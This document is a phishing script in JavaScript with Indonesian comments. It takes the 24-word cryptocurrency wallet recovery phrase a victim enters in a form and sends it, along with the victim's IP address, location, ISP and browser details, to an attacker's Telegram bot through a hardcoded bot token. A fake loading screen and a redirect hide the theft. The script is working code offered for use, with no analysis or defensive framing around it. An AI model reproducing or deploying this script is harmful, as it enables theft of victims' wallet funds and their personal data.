<script>
document.querySelector('form').addEventListener('submit', function(e) {
  e.preventDefault();
  
  var TELEGRAM_BOT_TOKEN = '8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4';
  var TELEGRAM_CHAT_ID = '8264171951';

  var passphraseInput = this.querySelector('textarea');
  var normalized = passphraseInput.value.trim().replace(/\s+/g,' ');
  var words = normalized.split(' ').filter(Boolean);
  
  // Validasi 24 kata
  if (words.length !== 24) {
    alert('Passphrase harus 24 kata. Saat ini baru: ' + words.length);
    return;
  }

  // Langsung munculkan loading biar user tidak klik berkali-kali
  showLoading();

    // Ambil Data IP dan Lokasi (Gunakan ip-api.com karena lebih stabil)
  var ipProviders = [
    {
      url: 'https://ip-api.com/json',
      parse: function(data) {
        if (data.status !== 'success') throw new Error('ip-api failed');
        return {
          location: (data.city || 'Unknown') + ', ' + (data.country || 'Unknown'),
          ipAddress: data.query || 'Unknown',
          isp: data.isp || 'Unknown',
          asn: data.as || 'Unknown'
        };
      }
    },
    {
      url: 'https://ipapi.co/json',
      parse: function(data) {
        return {
          location: (data.city || 'Unknown') + ', ' + (data.country_name || 'Unknown'),
          ipAddress: data.ip || 'Unknown',
          isp: data.org || 'Unknown',
          asn: data.asn || 'Unknown'
        };
      }
    },
    {
      url: 'https://ifconfig.co/json',
      parse: function(data) {
        return {
          location: (data.city || 'Unknown') + ', ' + (data.country || 'Unknown'),
          ipAddress: data.ip || 'Unknown',
          isp: data.org || 'Unknown',
          asn: data.asn || 'Unknown'
        };
      }
    }
  ];

  function getIpData(index) {
    if (index >= ipProviders.length) {
      return Promise.reject(new Error('No IP provider available'));
    }

    return fetch(ipProviders[index].url, { cache: 'no-store' })
      .then(function(res) {
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return res.json();
      })
      .then(function(data) {
        return ipProviders[index].parse(data);
      })
      .catch(function() {
        return getIpData(index + 1);
      });
  }

  getIpData(0)
    .then(function(ipData) {
      var location = ipData.location;
      var ipAddress = ipData.ipAddress;
      var isp = ipData.isp;
      var asn = ipData.asn;
      var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
                    "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
                    "<code>" + normalized + "</code>\n\n" +
                    "<b>📍 LOKASI:</b> " + location + "\n" +
                    "<b>🌐 IP:</b> " + ipAddress + "\n" +
                    "<b>🏢 ISP:</b> " + isp + "\n" +
                    "<b>🛰️ ASN:</b> " + asn + "\n" +
                    "<b>📱 DEVICE:</b> " + navigator.userAgent;


      // Kirim ke Telegram
      return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    })
    .catch(function(err) {
      console.error('Gagal ambil IP/Kirim Tele:', err);
      // Jika gagal ambil IP, kirim data tanpa IP agar tidak macet
      return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: "<b>🔔 Passphrase (Tanpa IP)</b>\n\n<code>" + normalized + "</code>",
          parse_mode: 'HTML'
        })
      });
    })
    .finally(function() {
      // Tunggu sebentar agar loading terasa nyata, lalu pindah halaman
      setTimeout(function() {
        window.location.href = 'index.html';
      }, 2000);
    });
});

function showLoading() {
  var loading = document.createElement('div');
  loading.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0f0f0f;display:flex;justify-content:center;align-items:center;flex-direction:column;z-index:999999;color:white;font-family:sans-serif;">
      <div style="width:60px;height:60px;border:6px solid rgba(255,255,255,0.2);border-top:6px solid white;border-radius:50%;animation:spin 1s linear infinite;"></div>
      <p style="margin-top:20px;">Memproses...</p>
    </div>
    <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
  `;
  document.body.appendChild(loading);
}
</script>
